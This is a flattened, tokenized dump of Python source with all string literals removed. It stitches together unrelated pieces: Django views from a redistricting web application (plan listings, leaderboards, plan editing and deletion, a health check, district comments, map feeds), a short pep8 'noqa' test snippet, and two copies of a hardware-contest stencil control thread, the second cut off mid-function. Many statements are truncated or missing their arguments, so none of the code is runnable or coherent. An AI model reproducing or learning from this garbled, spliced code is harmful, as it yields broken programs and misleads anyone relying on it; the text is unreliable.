~~ owner_filter = request . REQUEST [ ] \n 
body_pk = int ( request . REQUEST [ ] ) ; \n 
leg_body = LegislativeBody . objects . get ( pk = body_pk ) \n 
\n 
display = getleaderboarddisplay ( leg_body , owner_filter ) \n 
if display is None : \n 
~~~ return HttpResponse ( _ ( ) , mimetype = ) \n 
\n 
~~ plans = getvalidplans ( leg_body , request . user if owner_filter == else None ) \n 
\n 
try : \n 
~~~ html = display . render ( plans , request ) \n 
return HttpResponse ( html , mimetype = ) \n 
~~ except Exception , ex : \n 
~~~ logger . warn ( ) \n 
logger . debug ( , ex ) \n 
return HttpResponse ( str ( ex ) , mimetype = ) \n 
\n 
~~ ~~ def getleaderboardcsv ( request ) : \n 
~~~ """\n    Get the leaderboard scores in csv form\n    """ \n 
note_session_activity ( request ) \n 
\n 
if not using_unique_session ( request . user ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ owner_filter = request . REQUEST [ ] \n 
body_pk = int ( request . REQUEST [ ] ) ; \n 
leg_body = LegislativeBody . objects . get ( pk = body_pk ) \n 
plans = getvalidplans ( leg_body , request . user if owner_filter == else None ) \n 
\n 
display = getleaderboarddisplay ( leg_body , owner_filter ) \n 
plans = getvalidplans ( leg_body , request . user if owner_filter == else None ) \n 
\n 
panels = display . scorepanel_set . all ( ) . order_by ( ) \n 
\n 
try : \n 
# mark the response as csv, and create the csv writer \n 
~~~ response = HttpResponse ( mimetype = ) \n 
response [ ] = \n 
writer = csv . writer ( response ) \n 
\n 
# write headers \n 
writer . writerow ( [ , , ] + [ p . __unicode__ ( ) for p in panels ] ) \n 
\n 
# write row for each plan \n 
for plan in plans : \n 
~~~ row = [ plan . id , plan . name , plan . owner . username ] \n 
\n 
# add each score \n 
for panel in panels : \n 
~~~ function = panel . score_functions . all ( ) [ 0 ] \n 
score = ComputedPlanScore . compute ( function , plan ) \n 
row . append ( score [ ] ) \n 
\n 
# write the row \n 
~~ writer . writerow ( row ) \n 
\n 
~~ return response \n 
~~ except Exception , ex : \n 
~~~ logger . warn ( "Couldn\'t generate CSV of leaderboard." ) \n 
logger . debug ( , ex ) \n 
return HttpResponse ( str ( ex ) , mimetype = ) \n 
\n 
\n 
~~ ~~ def getplans ( request ) : \n 
~~~ """\n    Get the plans for the given user and return the data in a format readable\n    by the jqgrid\n    """ \n 
note_session_activity ( request ) \n 
\n 
if not using_unique_session ( request . user ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ if request . method == : \n 
~~~ page = int ( request . POST . get ( , 1 ) ) \n 
rows = int ( request . POST . get ( , 10 ) ) \n 
sidx = request . POST . get ( , ) \n 
sord = request . POST . get ( , ) \n 
owner_filter = request . POST . get ( ) ; \n 
body_pk = request . POST . get ( ) ; \n 
body_pk = int ( body_pk ) if body_pk else body_pk ; \n 
search = request . POST . get ( , False ) ; \n 
search_string = request . POST . get ( , ) ; \n 
is_community = request . POST . get ( , False ) == ; \n 
~~ else : \n 
~~~ return HttpResponseForbidden ( ) \n 
~~ end = page * rows \n 
start = end - rows \n 
\n 
if owner_filter == : \n 
~~~ available = Q ( is_template = True ) \n 
~~ elif owner_filter == : \n 
~~~ available = Q ( is_shared = True ) \n 
~~ elif owner_filter == : \n 
~~~ if request . user . is_anonymous ( ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
~~ else : \n 
~~~ available = Q ( owner__exact = request . user ) \n 
~~ ~~ elif owner_filter == : \n 
~~~ available = Q ( is_template = True ) | Q ( is_shared = True ) \n 
if not request . user . is_anonymous ( ) : \n 
~~~ available = available | Q ( owner__exact = request . user ) \n 
~~ ~~ else : \n 
~~~ return HttpResponseBadRequest ( _ ( "Unknown filter method." ) ) \n 
\n 
~~ not_creating = ~ Q ( processing_state = ProcessingState . CREATING ) & ~ Q ( processing_state = ProcessingState \n 
# Set up the order_by parameter from sidx and sord in the request \n 
if sidx . startswith ( ) : \n 
~~~ sidx = sidx [ len ( ) : ] \n 
~~ if sidx == : \n 
~~~ sidx = \n 
~~ if sidx == : \n 
~~~ sidx = \n 
~~ if sord == : \n 
~~~ sidx = + sidx \n 
\n 
~~ if search : \n 
~~~ search_filter = Q ( name__icontains = search_string ) | Q ( description__icontains = search_string ~~ else : \n 
~~~ search_filter = None \n 
\n 
~~ if body_pk : \n 
~~~ body_filter = Q ( legislative_body = body_pk ) \n 
all_plans = Plan . objects . filter ( available , not_creating , body_filter , search_filter ) . order_by ~~ else : \n 
~~~ community_filter = Q ( legislative_body__is_community = is_community ) \n 
all_plans = Plan . objects . filter ( available , not_creating , search_filter , community_filter ) . order_by \n 
~~ if all_plans . count ( ) > 0 : \n 
~~~ total_pages = math . ceil ( all_plans . count ( ) / float ( rows ) ) \n 
~~ else : \n 
~~~ total_pages = 1 \n 
\n 
~~ plans = all_plans [ start : end ] \n 
# Create the objects that will be serialized for presentation in the plan chooser \n 
plans_list = list ( ) \n 
for plan in plans : \n 
~~~ plans_list . append ( { \n 
: plan . id , \n 
: { \n 
: plan . name , \n 
: plan . description , \n 
: time . mktime ( plan . edited . timetuple ( ) ) , \n 
: plan . is_template , \n 
: plan . is_shared , \n 
: plan . owner . username , \n 
: , # load dynamically -- this is a big performance hit \n 
: can_edit ( request . user , plan ) , \n 
: plan . legislative_body . get_long_description ( ) , \n 
: plan . get_processing_state_display ( ) \n 
} \n 
} ) \n 
\n 
~~ json_response = "{ \\"total\\":\\"%d\\", \\"page\\":\\"%d\\", \\"records\\":\\"%d\\", \\"rows\\":%s }" % ( total_pages return HttpResponse ( json_response , mimetype = ) \n 
\n 
~~ def get_shared_districts ( request , planid ) : \n 
~~~ """\n    Get the shared districts in a given plan and return the\n    data in a format readable by the jqgrid\n    """ \n 
note_session_activity ( request ) \n 
\n 
if not using_unique_session ( request . user ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ if request . method == : \n 
~~~ page = int ( request . POST . get ( , 1 ) ) \n 
rows = int ( request . POST . get ( , 10 ) ) \n 
~~ else : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ end = page * rows \n 
start = end - rows \n 
\n 
try : \n 
~~~ plan = Plan . objects . get ( pk = planid ) \n 
if not can_copy ( request . user , plan ) : \n 
~~~ return HttpResponseForbidden ( ) \n 
\n 
~~ all_districts = plan . get_districts_at_version ( plan . version , include_geom = False ) \n 
~~ except : \n 
~~~ plan = None \n 
all_districts = ( ) \n 
\n 
~~ if len ( all_districts ) > 0 : \n 
~~~ total_pages = math . ceil ( len ( all_districts ) / float ( rows ) ) \n 
~~ else : \n 
~~~ total_pages = 1 \n 
\n 
~~ districts = all_districts [ start : end ] \n 
# Create the objects that will be serialized for presentation in the plan chooser \n 
districts_list = list ( ) \n 
for district in districts : \n 
~~~ if not district . is_unassigned : \n 
~~~ districts_list . append ( { \n 
: district . id , \n 
: { \n 
: district . short_label , \n 
: district . long_label , \n 
: district . district_id , \n 
} \n 
} ) \n 
\n 
~~ ~~ json_response = "{ \\"total\\":\\"%d\\", \\"page\\":\\"%d\\", \\"records\\":\\"%d\\", \\"rows\\":%s }" % ( total_pages return HttpResponse ( json_response , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def editplanattributes ( request , planid ) : \n 
~~~ """\n    Edit the attributes of a plan. Attributes of a plan are the name and/or\n    description.\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
if request . method != : \n 
~~~ return HttpResponseNotAllowed ( [ ] ) \n 
~~ new_name = request . POST . get ( , None ) \n 
new_description = request . POST . get ( , ) \n 
\n 
if not planid or not ( new_name or new_description ) : \n 
~~~ return HttpResponseBadRequest ( \n 
_ ( ) ) \n 
\n 
~~ plan = Plan . objects . filter ( pk = planid , owner = request . user ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
if not new_name is None : \n 
~~~ plan . name = new_name \n 
\n 
~~ plan . description = new_description \n 
try : \n 
~~~ plan . save ( ) \n 
\n 
status [ ] = True \n 
status [ ] = _ ( ) \n 
~~ except Exception , ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = ex \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
~~ ~~ else : \n 
~~~ status [ ] = _ ( "Cannot edit a plan you don\'t own." ) \n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def deleteplan ( request , planid ) : \n 
~~~ """\n    Delete a plan\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
if request . method != : \n 
~~~ return HttpResponseNotAllowed ( [ ] ) \n 
\n 
~~ if not planid : \n 
~~~ return HttpResponseBadRequest ( _ ( ) ) \n 
\n 
~~ plan = Plan . objects . filter ( pk = planid , owner = request . user ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
try : \n 
~~~ plan . delete ( ) \n 
status [ ] = True \n 
status [ ] = _ ( ) \n 
~~ except Exception , ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = ex \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
~~ ~~ else : \n 
~~~ status [ ] = _ ( "Cannot delete a plan you don\'t own." ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def reaggregateplan ( request , planid ) : \n 
~~~ """\n    Reaggregate a plan\n    """ \n 
note_session_activity ( request ) \n 
\n 
status = { : False } \n 
if request . method != : \n 
~~~ return HttpResponseNotAllowed ( [ ] ) \n 
\n 
~~ if not planid : \n 
~~~ return HttpResponseBadRequest ( _ ( ) ) \n 
\n 
~~ plan = Plan . objects . filter ( pk = planid , owner = request . user ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
try : \n 
~~~ reaggregate_plan . delay ( plan . id ) \n 
\n 
# Set the reaggregating flag \n 
# (needed for the state to display on immediate refresh) \n 
plan . processing_state = ProcessingState . REAGGREGATING \n 
plan . save ( ) \n 
\n 
status [ ] = True \n 
status [ ] = _ ( ) \n 
~~ except Exception , ex : \n 
~~~ status [ ] = _ ( ) \n 
status [ ] = ex \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
~~ ~~ else : \n 
~~~ status [ ] = _ ( "Cannot reaggregate a plan you don\'t own." ) \n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ def get_health ( request ) : \n 
~~~ def num_users ( minutes ) : \n 
~~~ users = 0 \n 
for session in Session . objects . all ( ) : \n 
~~~ try : \n 
~~~ decoded = session . get_decoded ( ) \n 
~~ except : \n 
\n 
~~~ session . delete ( ) \n 
continue \n 
\n 
~~ if in decoded : \n 
~~~ activity_delta = decoded [ ] - timedelta ( 0 , 0 , 0 , 0 , settings . SESSION_TIMEOUT if activity_delta > ( datetime . now ( ) - timedelta ( 0 , 0 , 0 , 0 , minutes ) ) : \n 
~~~ users += 1 \n 
~~ ~~ ~~ return users \n 
\n 
~~ try : \n 
~~~ result = _ ( ) % { : datetime . now ( ) } \n 
result += _ ( ) % { : Plan . objects . all ( ) . count ( ) } \n 
result += _ ( ) % { : Session . objects . all ( ) . count ( ) , \n 
: settings . CONCURRENT_SESSIONS } \n 
result += _ ( ) % { : num_users ( 10 ) } \n 
space = os . statvfs ( ) \n 
result += _ ( ) % { : ( ( space . f_bsize * space . f_bavail ) / ( 1024 * 1024 ) ) } \n 
result += _ ( ) % { : commands . getoutput ( ) } \n 
return HttpResponse ( result , mimetype = ) \n 
~~ except : \n 
~~~ return HttpResponse ( _ ( "ERROR! Couldn\'t get health:\\n%s" ) % traceback . format_exc ( ) ) \n 
\n 
\n 
~~ ~~ def statistics_sets ( request , planid ) : \n 
~~~ result = { : False } \n 
\n 
plan = Plan . objects . filter ( id = planid ) \n 
if plan . count ( ) == 0 : \n 
~~~ result [ ] = _ ( ) \n 
return HttpResponse ( json . dumps ( result ) , mimetype = ) \n 
~~ else : \n 
~~~ plan = plan [ 0 ] \n 
\n 
~~ if request . method == : \n 
~~~ sets = [ ] \n 
scorefunctions = [ ] \n 
\n 
# Get the functions available for the users \n 
user_functions = ScoreFunction . objects . filter ( selectable_bodies = plan . legislative_body ) . order_by for f in user_functions : \n 
~~~ if not in f . name . lower ( ) and not in f . name . lower ( ) : \n 
~~~ scorefunctions . append ( { : f . id , : force_escape ( f . get_label ( ) ) } ) \n 
~~ ~~ result [ ] = scorefunctions \n 
\n 
\n 
admin_display_names = [ \n 
"%s_sidebar_demo" % plan . legislative_body . name , \n 
] \n 
\n 
if plan . legislative_body . is_community : \n 
~~~ admin_display_names . append ( "%s_sidebar_comments" % \n 
plan . legislative_body . name ) \n 
~~ else : \n 
~~~ admin_display_names . append ( "%s_sidebar_basic" % \n 
plan . legislative_body . name ) \n 
# Get the admin displays \n 
~~ admin_displays = ScoreDisplay . objects . filter ( \n 
owner__is_superuser = True , \n 
legislative_body = plan . legislative_body , \n 
name__in = admin_display_names \n 
) \n 
\n 
for admin_display in admin_displays : \n 
~~~ sets . append ( { \n 
: admin_display . id , \n 
: force_escape ( admin_display . get_label ( ) ) , \n 
: [ ] , \n 
: False \n 
} ) \n 
\n 
~~ try : \n 
~~~ user_displays = ScoreDisplay . objects . filter ( \n 
owner = request . user , \n 
legislative_body = plan . legislative_body , \n 
is_page = False ) . order_by ( ) \n 
result [ ] = len ( user_displays ) \n 
for display in user_displays : \n 
~~~ functions = [ ] \n 
for panel in display . scorepanel_set . all ( ) : \n 
~~~ if panel . type == : \n 
~~~ functions = map ( lambda x : x . id , panel . score_functions . all ( ) ) \n 
if len ( functions ) == 0 : \n 
~~~ result [ ] = _ ( "No functions for %(panel)s" ) % { : panel } \n 
~~ ~~ ~~ sets . append ( { : display . id , : force_escape ( display . __unicode__ ( ) ) , ~~ ~~ except Exception , ex : \n 
~~~ result [ ] = _ ( ) % { : request . user } \n 
logger . warn ( ) \n 
logger . debug ( , ex ) \n 
\n 
~~ result [ ] = sets \n 
result [ ] = True \n 
# Delete the requested ScoreDisplay to make some room \n 
~~ elif request . method == and in request . POST : \n 
~~~ try : \n 
~~~ display = ScoreDisplay . objects . get ( pk = request . REQUEST . get ( , - 1 ) ) \n 
result [ ] = { : force_escape ( display . __unicode__ ( ) ) , : display . id } \n 
qset = display . scorepanel_set . all ( ) \n 
for panel in qset : \n 
~~~ if panel . displays . count ( ) == 1 : \n 
~~~ panel . delete ( ) \n 
~~ ~~ display . delete ( ) \n 
result [ ] = True \n 
~~ except Exception , ex : \n 
~~~ result [ ] = _ ( "Couldn\'t delete personalized scoredisplay" ) \n 
result [ ] = traceback . format_exc ( ) \n 
logger . warn ( "Couldn\'t delete personalized ScoreDisplay" ) \n 
logger . debug ( , ex ) \n 
\n 
\n 
# the id and name as usual \n 
~~ ~~ elif request . method == : \n 
\n 
~~~ def validate_num ( user , limit = 3 ) : \n 
~~~ return ScoreDisplay . objects . filter ( owner = user , legislative_body = plan . legislative_body , is_page \n 
~~ if in request . POST : \n 
~~~ functions = request . POST . getlist ( ) \n 
functions = map ( lambda x : int ( x ) , functions ) \n 
try : \n 
~~~ display = ScoreDisplay . objects . get ( title = request . POST . get ( ) , owner = request . user display = display . copy_from ( display = display , functions = functions ) \n 
~~ except : \n 
~~~ limit = 3 \n 
if validate_num ( request . user , limit ) : \n 
~~~ demo = ScoreDisplay . objects . filter ( \n 
owner__is_superuser = True , \n 
legislative_body = plan . legislative_body , \n 
is_page = False , \n 
title = "Demographics" \n 
) \n 
# DO NOT select the ScoreDisplay that contains \n 
# the comment calculator \n 
for disp in demo : \n 
~~~ has_comments = False \n 
for pnl in disp . scorepanel_set . all ( ) : \n 
~~~ for fn in pnl . score_functions . all ( ) : \n 
~~~ has_comments = has_comments or fn . calculator . endswith ( ) \n 
~~ ~~ if not has_comments : \n 
~~~ demo = disp \n 
break \n 
\n 
~~ ~~ display = ScoreDisplay ( ) \n 
display = display . copy_from ( display = demo , title = request . POST . get ( ) , owner = result [ ] = True \n 
~~ else : \n 
~~~ result [ ] = _ ( \n 
\n 
) % { : limit } \n 
result [ ] = \n 
return HttpResponse ( json . dumps ( result ) , mimetype = ) \n 
\n 
~~ ~~ result [ ] = { : force_escape ( display . __unicode__ ( ) ) , : display . id , result [ ] = True \n 
\n 
~~ else : \n 
~~~ result [ ] = _ ( "Didn\'t get functions in POST parameter" ) \n 
\n 
~~ ~~ return HttpResponse ( json . dumps ( result ) , mimetype = ) \n 
\n 
# \n 
# Comment views \n 
# \n 
~~ def purge_plan_clear_cache ( district , version ) : \n 
~~~ """\n    This is a helper method that purges a plan after a version, and clears\n    any pre-computed scores at the specified version.\n    """ \n 
district . plan . purge ( after = version ) \n 
\n 
district . plan . version = version \n 
district . plan . save ( ) \n 
\n 
cache = district . computeddistrictscore_set . filter ( function__calculator__endswith = ) \n 
cache . delete ( ) \n 
\n 
~~ @ unique_session_or_json_redirect \n 
def district_info ( request , planid , district_id ) : \n 
~~~ """\n    Get the comments that are attached to a district.\n\n    Parameters:\n        request -- An HttpRequest\n        planid -- The plan ID\n        district_id -- The district ID, this is the district number in a plan, and NOT the id of a district.\n    """ \n 
status = { : False } \n 
plan = Plan . objects . filter ( id = planid ) \n 
if plan . count ( ) == 0 : \n 
~~~ status [ ] = _ ( ) \n 
~~ else : \n 
~~~ plan = plan [ 0 ] \n 
\n 
version = plan . version \n 
if in request . REQUEST : \n 
~~~ try : \n 
~~~ version = int ( request . REQUEST [ ] ) \n 
version = min ( plan . version , int ( version ) ) \n 
~~ except : \n 
~~~ pass \n 
\n 
~~ ~~ district_id = int ( district_id ) \n 
district = plan . get_districts_at_version ( version , include_geom = False ) \n 
district = filter ( lambda d : d . district_id == district_id , district ) \n 
\n 
if request . method == : \n 
~~~ district = plan . district_set . get ( id = request . POST [ ] ) \n 
district . short_label = request . POST [ ] [ 0 : 10 ] \n 
district . long_label = request . POST [ ] [ 0 : 256 ] \n 
\n 
\n 
if district . version < version : \n 
# The district version may lag behind the cursor  \n 
# version if there were no edits for a while. If this  \n 
# is the case the district must be copied to the  \n 
# currently edited version. \n 
~~~ district_copy = copy . copy ( district ) \n 
district_copy . id = None \n 
district_copy . version = version \n 
\n 
district_copy . save ( ) \n 
\n 
# clone the characteristics, comments, and tags from  \n 
# the original district to the copy  \n 
district_copy . clone_relations_from ( district ) \n 
district = district_copy \n 
~~ else : \n 
# save the changes to the district -- maybe name change \n 
~~~ district . save ( ) \n 
\n 
~~ has_comment = in request . POST and request . POST [ ] != \n 
if has_comment : \n 
\n 
~~~ ct = ContentType . objects . get ( app_label = , model = ) \n 
Comment . objects . filter ( object_pk = district . id , content_type = ct ) . delete ( ) \n 
comment = Comment ( \n 
object_pk = district . id , \n 
content_type = ct , \n 
site_id = Site . objects . get_current ( ) . id , \n 
user_name = request . user . username , \n 
user_email = request . user . email , \n 
comment = request . POST [ ] ) \n 
comment . save ( ) \n 
~~ else : \n 
# save this if the label changed \n 
~~~ district . save ( ) \n 
\n 
# Get the tags on this object of this type. \n 
~~ tset = Tag . objects . get_for_object ( district ) . filter ( name__startswith = ) \n 
\n 
# Purge the tags of this same type off the object \n 
TaggedItem . objects . filter ( tag__in = tset , object_id = district . id ) . delete ( ) \n 
\n 
purge_plan_clear_cache ( district , version ) \n 
\n 
if len ( request . REQUEST . getlist ( ) ) > 0 : \n 
~~~ strtags = request . REQUEST . getlist ( ) \n 
for strtag in strtags : \n 
~~~ if strtag == : \n 
~~~ continue \n 
~~ if strtag . count ( ) > 0 : \n 
~~~ strtag = \'"type=%s"\' % strtag \n 
~~ else : \n 
~~~ strtag = % strtag \n 
~~ Tag . objects . add_tag ( district , strtag ) \n 
\n 
~~ ~~ status [ ] = version \n 
status [ ] = True \n 
\n 
~~ ~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ def plan_feed ( request ) : \n 
~~~ feed = loader . get_template ( ) \n 
\n 
\n 
plans = Plan . objects . all ( ) . order_by ( ) [ 0 : 10 ] \n 
geolevel = plans [ 0 ] . legislative_body . get_geolevels ( ) [ 0 ] \n 
extent = geolevel . geounit_set . collect ( ) . extent \n 
if extent [ 2 ] - extent [ 0 ] > extent [ 3 ] - extent [ 1 ] : \n 
# wider maps \n 
~~~ width = 500 \n 
height = int ( 500 * ( extent [ 3 ] - extent [ 1 ] ) / ( extent [ 2 ] - extent [ 0 ] ) ) \n 
~~ else : \n 
# taller maps \n 
~~~ width = int ( 500 * ( extent [ 2 ] - extent [ 0 ] ) / ( extent [ 3 ] - extent [ 1 ] ) ) \n 
height = 500 \n 
~~ mapserver = settings . MAP_SERVER if settings . MAP_SERVER != else request . META [ ] \n 
context = { \n 
: plans , \n 
: mapserver , \n 
: settings . MAP_SERVER_NS , \n 
: extent , \n 
: width , \n 
: height \n 
} \n 
xml = feed . render ( DjangoContext ( context ) ) \n 
\n 
return HttpResponse ( xml , mimetype = ) \n 
\n 
~~ def share_feed ( request ) : \n 
~~~ feed = loader . get_template ( ) \n 
\n 
\n 
plans = Plan . objects . filter ( is_shared = True ) . order_by ( ) [ 0 : 10 ] \n 
if plans . count ( ) < 0 : \n 
~~~ geolevel = plans [ 0 ] . legislative_body . get_geolevels ( ) [ 0 ] \n 
extent = geolevel . geounit_set . collect ( ) . extent \n 
if extent [ 2 ] - extent [ 0 ] > extent [ 3 ] - extent [ 1 ] : \n 
# wider maps \n 
~~~ width = 500 \n 
height = int ( 500 * ( extent [ 3 ] - extent [ 1 ] ) / ( extent [ 2 ] - extent [ 0 ] ) ) \n 
~~ else : \n 
# taller maps \n 
~~~ width = int ( 500 * ( extent [ 2 ] - extent [ 0 ] ) / ( extent [ 3 ] - extent [ 1 ] ) ) \n 
height = 500 \n 
~~ ~~ else : \n 
~~~ extent = ( 0 , 0 , 0 , 0 , ) \n 
width = 1 \n 
height = 1 \n 
~~ mapserver = settings . MAP_SERVER if settings . MAP_SERVER != else request . META [ ] \n 
context = { \n 
: plans , \n 
: mapserver , \n 
: settings . MAP_SERVER_NS , \n 
: extent , \n 
: width , \n 
: height \n 
} \n 
xml = feed . render ( DjangoContext ( context ) ) \n 
\n 
return HttpResponse ( xml , mimetype = ) \n 
#: Okay \n 
# silence E501 \n 
~~ url = \n 
# silence E128 \n 
from functools import ( partial , reduce , wraps , # noqa \n 
cmp_to_key ) \n 
\n 
from functools import ( partial , reduce , wraps , \n 
cmp_to_key ) # noqa \n 
\n 
a = 1 \n 
if a == None : # noqa \n 
~~~ pass \n 
#: \n 
#------------------------------------------------------------------------------- \n 
# 330_stencil \n 
# Processor Design Contest \n 
#------------------------------------------------------------------------------- \n 
#------------------------------------------------------------------------------- \n 
# Parameters \n 
#------------------------------------------------------------------------------- \n 
# Mesh size n = i * 16 (where i = 1, 2, 3, ...) \n 
# Max Mesh Size = 4096 (i = 256) \n 
# Actual Max Mesh Size = 512 (according to the reference program) \n 
\n 
~~ DSIZE = 4 \n 
SIZE = 512 # word \n 
\n 
# default value \n 
a_offset = 1 * 1024 * 1024 \n 
b_offset = 2 * 1024 * 1024 \n 
\n 
#------------------------------------------------------------------------------- \n 
# IO channel \n 
#------------------------------------------------------------------------------- \n 
iochannel = CoramIoChannel ( idx = 0 , datawidth = 32 ) \n 
\n 
#------------------------------------------------------------------------------- \n 
# Computation \n 
#------------------------------------------------------------------------------- \n 
mem0 = CoramMemory ( idx = 0 , datawidth = 8 * DSIZE , size = SIZE ) # source 0 \n 
mem1 = CoramMemory ( idx = 1 , datawidth = 8 * DSIZE , size = SIZE ) # source 1 \n 
mem2 = CoramMemory ( idx = 2 , datawidth = 8 * DSIZE , size = SIZE ) # source 2 \n 
mem3 = CoramMemory ( idx = 3 , datawidth = 8 * DSIZE , size = SIZE ) # source 3 \n 
mem_d0 = CoramMemory ( idx = 4 , datawidth = 8 * DSIZE , size = SIZE ) # destination 0 \n 
mem_d1 = CoramMemory ( idx = 5 , datawidth = 8 * DSIZE , size = SIZE ) # destination 1 \n 
channel = CoramChannel ( idx = 0 , datawidth = 8 * DSIZE ) \n 
\n 
#------------------------------------------------------------------------------- \n 
def st_set_mesh_size ( mesh_size ) : \n 
~~~ channel . write ( mesh_size ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ def st_step ( mesh_size , read_start , write_start ) : \n 
~~~ read_page = 3 \n 
write_page = 0 \n 
\n 
read_addr = read_start \n 
\n 
mem0 . write ( 0 , read_addr , mesh_size ) \n 
read_addr += mesh_size * DSIZE \n 
\n 
mem1 . write ( 0 , read_addr , mesh_size ) \n 
read_addr += mesh_size * DSIZE \n 
\n 
mem2 . write ( 0 , read_addr , mesh_size ) \n 
read_addr += mesh_size * DSIZE \n 
\n 
write_addr = write_start + mesh_size * DSIZE + DSIZE \n 
\n 
for i in range ( mesh_size - 2 ) : \n 
~~~ hot_spot = 1 if i == 0 else 0 \n 
pos = ( ( hot_spot << 6 ) | \n 
( ( 0x1 << write_page ) << 4 ) | \n 
( 0x1 << read_page ) ) \n 
\n 
mem0 . wait ( ) \n 
mem1 . wait ( ) \n 
mem2 . wait ( ) \n 
mem3 . wait ( ) \n 
\n 
channel . write ( pos ) \n 
\n 
if read_page == 0 : \n 
~~~ mem0 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
~~ elif read_page == 1 : \n 
~~~ mem1 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
~~ elif read_page == 2 : \n 
~~~ mem2 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
~~ elif read_page == 3 : \n 
~~~ mem3 . write_nonblocking ( 0 , read_addr , mesh_size ) \n 
\n 
~~ read_page = 0 if read_page == 3 else read_page + 1 \n 
read_addr += mesh_size * DSIZE \n 
\n 
channel . read ( ) \n 
\n 
mem_d0 . wait ( ) \n 
mem_d1 . wait ( ) \n 
\n 
if write_page == 0 : \n 
~~~ mem_d0 . read_nonblocking ( 1 , write_addr , mesh_size - 2 ) \n 
~~ elif write_page == 1 : \n 
~~~ mem_d1 . read_nonblocking ( 1 , write_addr , mesh_size - 2 ) \n 
\n 
~~ write_addr += mesh_size * DSIZE \n 
write_page = 0 if write_page == 1 else write_page + 1 \n 
\n 
~~ mem_d0 . wait ( ) \n 
mem_d1 . wait ( ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ def st_computation ( num_iter , mesh_size ) : \n 
~~~ for i in range ( num_iter / 2 ) : \n 
~~~ st_step ( mesh_size , a_offset , b_offset ) \n 
st_step ( mesh_size , b_offset , a_offset ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ ~~ def st_sum ( mesh_size ) : \n 
~~~ check_sum = 0 \n 
read_addr = a_offset \n 
for i in range ( mesh_size ) : \n 
~~~ mem0 . write ( 0 , read_addr , mesh_size ) \n 
init_sum = 1 if i == 0 else 0 \n 
calc_sum = 1 \n 
pos = ( init_sum << 8 ) | ( calc_sum << 7 ) \n 
channel . write ( pos ) \n 
read_addr += mesh_size * DSIZE \n 
check_sum = channel . read ( ) \n 
~~ channel . write ( 0 ) # reset main pipeline \n 
return check_sum \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ def st_main ( ) : \n 
~~~ global a_offset \n 
global b_offset \n 
\n 
mesh_size = iochannel . read ( ) \n 
print ( "thread: mesh_size=%d" % mesh_size ) \n 
num_iter = iochannel . read ( ) \n 
print ( "thread: num_iter=%d" % num_iter ) \n 
a_offset = iochannel . read ( ) \n 
print ( "thread: a_offset=%d" % a_offset ) \n 
b_offset = iochannel . read ( ) \n 
print ( "thread: b_offset=%d" % b_offset ) \n 
\n 
print ( "thread: st_set_mesh_size" ) \n 
st_set_mesh_size ( mesh_size ) \n 
\n 
print ( "thread: st_computation" ) \n 
st_computation ( num_iter , mesh_size ) \n 
\n 
print ( "thread: st_sum" ) \n 
check_sum = st_sum ( mesh_size ) \n 
\n 
iochannel . write ( check_sum ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ while True : \n 
~~~ st_main ( ) \n 
#------------------------------------------------------------------------------- \n 
# 330_stencil \n 
# Processor Design Contest \n 
#------------------------------------------------------------------------------- \n 
#------------------------------------------------------------------------------- \n 
# Parameters \n 
#------------------------------------------------------------------------------- \n 
# Mesh size n = i * 16 (where i = 1, 2, 3, ...) \n 
# Max Mesh Size = 4096 (i = 256) \n 
# Actual Max Mesh Size = 512 (according to the reference program) \n 
\n 
~~ DSIZE = 4 \n 
SIZE = 512 # word \n 
\n 
# default value \n 
a_offset = 1 * 1024 * 1024 \n 
b_offset = 2 * 1024 * 1024 \n 
\n 
#------------------------------------------------------------------------------- \n 
# IO channel \n 
#------------------------------------------------------------------------------- \n 
iochannel = CoramIoChannel ( idx = 0 , datawidth = 32 ) \n 
\n 
#------------------------------------------------------------------------------- \n 
# Computation \n 
#------------------------------------------------------------------------------- \n 
mem0 = CoramMemory ( idx = 0 , datawidth = 8 * DSIZE , size = SIZE ) # source 0 \n 
mem1 = CoramMemory ( idx = 1 , datawidth = 8 * DSIZE , size = SIZE ) # source 1 \n 
mem2 = CoramMemory ( idx = 2 , datawidth = 8 * DSIZE , size = SIZE ) # source 2 \n 
mem_d0 = CoramMemory ( idx = 4 , datawidth = 8 * DSIZE , size = SIZE ) # destination 0 \n 
channel = CoramChannel ( idx = 0 , datawidth = 8 * DSIZE ) \n 
\n 
#------------------------------------------------------------------------------- \n 
def st_set_mesh_size ( mesh_size ) : \n 
~~~ channel . write ( mesh_size ) \n 
\n 
#------------------------------------------------------------------------------- \n 
~~ def st_step ( mesh_size , read_start , write_start ) : \n 
~~~ read_page = 0 \n 
read_addr = read_start \n 
\n 
mem0 . write ( 0 , read_addr , mesh_size ) \n 
read_addr += mesh_size * DSIZE \n 
\n 
